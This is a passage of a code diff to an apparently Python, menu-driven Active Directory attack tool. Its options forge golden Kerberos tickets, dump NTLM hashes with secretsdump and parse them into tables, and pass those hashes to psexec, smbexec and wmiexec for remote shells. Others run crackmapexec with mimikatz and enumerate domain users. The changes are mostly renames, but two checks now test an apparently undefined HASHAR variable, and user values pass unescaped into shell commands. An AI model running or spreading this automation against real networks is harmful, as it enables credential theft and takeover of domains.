          command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
@@ -1294,7 +1295,7 @@ while True:
       if os.path.exists(IMP.rstrip(" ") + ".ccache"):
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
-         print("Golden TGT was not generated...")
+         print("\n[-] Golden TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1306,7 +1307,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
       if (NTM[:1] != "") & (SID[:1] != ""):
          command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
@@ -1317,14 +1318,14 @@ while True:
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
-          print("Golden TGT was not generated...")
+          print("[-] Golden TGT was not generated...")
 
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "." # Reset value
 
-      for x in range (0, MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PA[x].rstrip(" ")                 # GET HASH
+      for x in range (0, MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PASS[x].rstrip(" ")                 # GET HASH
       if HASH != ".":
          command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
          command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
@@ -1332,7 +1333,7 @@ while True:
       if os.path.exists(IMP.rstrip(" ") + ".ccache"):
          command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
-         print("Golden TGT was not generated...")
+         print("[-] Golden TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1344,19 +1345,19 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
       command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "." # Reset value
 
-      for x in range (0, MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PA[x].rstrip(" ")                 # GET HASH
+      for x in range (0, MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+            HASH = PASS[x].rstrip(" ")                 # GET HASH
 
       if HASH != ".":
          command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
       else:
-         print("Hash value was not found...")
+         print("[-] Hash value was not found...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1369,7 +1370,7 @@ while True:
 
    if selection =='51':
       command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
-      print("\n[+] Checking downloaded files: \n")
+      print("\n[*] Checking downloaded files: \n")
       command("ls -la ./" + DIR.rstrip(" "))
       prompt()
 
@@ -1394,7 +1395,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      print("\n[*] Please wait, this can take sometime...")
+      print("\n[*] [*] Enumerating, please wait this can take sometime...")
       command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
 
       command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
@@ -1419,13 +1420,13 @@ while True:
          get4 = get4.rstrip("\n")
 
          print("[+] Found User", get1)
-         US[x] = get1[:COL3]
-         PA[x] = get4[:COL4]
-         if len(US[x]) < COL3: US[x] = padding(US[x], COL3) 			# USER
-         if len(PA[x]) < COL4: PA[x] = padding(PA[x], COL4) 			# PASSWORD
+         USER[x] = get1[:COL3]
+         PASS[x] = get4[:COL4]
+         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
+         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
 
-      for z in range(0, MAX):
-         if US[z].rstrip(" ") == USR.rstrip(" "): NTM = PA[z]			# RESET DISPLAY HASH
+      for z in range(0, MAXX):
+         if USER[z].rstrip(" ") == USR.rstrip(" "): NTM = PASS[z]			# RESET DISPLAY HASH
 
       os.remove("SECRETS.tmp")
       prompt()
@@ -1441,7 +1442,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      print("\n[+] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
+      print("\n[*] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
 
       command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
@@ -1452,12 +1453,12 @@ while True:
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
       HASH = "." # Reset Value
-      for x in range (0, MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
+      for x in range (0, MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
+      print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
-      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
+      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
       else:
          print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
@@ -1472,19 +1473,19 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      print("\n[+] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
       command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
 
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
       HASH = "." # Reset hash value
 
-      for x in range (0,MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
+      for x in range (0,MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
+      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
          command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
-         print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
+         print("\n[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1496,14 +1497,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      print("\n[+] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
       command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
       HASH = "." # Reset hash value
 
-      for x in range (0,MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
+      for x in range (0,MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
       if HASH != ".":
          command(PATH + "smbexec.py -hashes :" + HASH + " " + DOM.rstrip(" ") + "\\" + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -1520,14 +1521,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      print("\n[+] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
+      print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
       command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
+      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
       HASH = "." # Reset Hash value
 
-      for x in range (0,MAX):
-         if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
+      for x in range (0,MAXX):
+         if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
       if HASH != ".":  
          command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
@@ -1552,11 +1553,11 @@ while True:
          command("sed -i '/#/d' users.txt 2>&1")
          print("[+] NCrack minimal.usr list added as well...")
 
-      for x in range (0,MAX):
-         US[x] = linecache.getline("users.txt", x+1).rstrip(" ")
-         if len(US[x]) < COL3: US[x] = padding(US[x], COL3)      
+      for x in range (0,MAXX):
+         USER[x] = linecache.getline("users.txt", x+1).rstrip(" ")
+         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)      
 
-#      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
+#      if USER[12][:1] != " ": USER[11] = "Some users are not shown!!"
       prompt()
 
 #------------------------------------------------------------------------------------- 
@@ -1569,11 +1570,9 @@ while True:
 
    if selection =='59':
       command("nano users.txt")
-
-      for x in range (0, MAX):
-         US[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
-         if len(US[x]) < COL3: US[x] = padding(US[x], COL3)
-#      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
+      for x in range (0, MAXX):
+         USER[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
+         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1758,9 +1757,9 @@ while True:
 
 # -------------------------------------------------------------------------------------
 
-      for x in range (0, MAX):
-         US[x] = " "*COL3
-         PA[x] = " "*COL4
+      for x in range (0, MAXX):
+         USER[x] = " "*COL3
+         PASS[x] = " "*COL4
     
       command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.txt")      
 
@@ -1784,15 +1783,15 @@ while True:
             temp1,temp2,temp3 = test5.split(":");
          except ValueError:
             temp2 = "Error..."
-         US[x] = temp2
-         US[x] = US[x].replace("[","")
-         US[x] = US[x].replace("]","")
-         US[x] = US[x].replace("rid","")
-         print ("[+] Found user", US[x])
+         USER[x] = temp2
+         USER[x] = USER[x].replace("[","")
+         USER[x] = USER[x].replace("]","")
+         USER[x] = USER[x].replace("rid","")
+         print ("[+] Found user", USER[x])
 
-         if len(US[x]) < COL3:
-            US[x] = padding(US[x], COL3)		# Populate new values.
-         command("echo " + US[x] + " >> users.txt")
+         if len(USER[x]) < COL3:
+            USER[x] = padding(USER[x], COL3)		# Populate new values.
+         command("echo " + USER[x] + " >> users.txt")
 
       os.remove("domusers.txt")
       prompt()
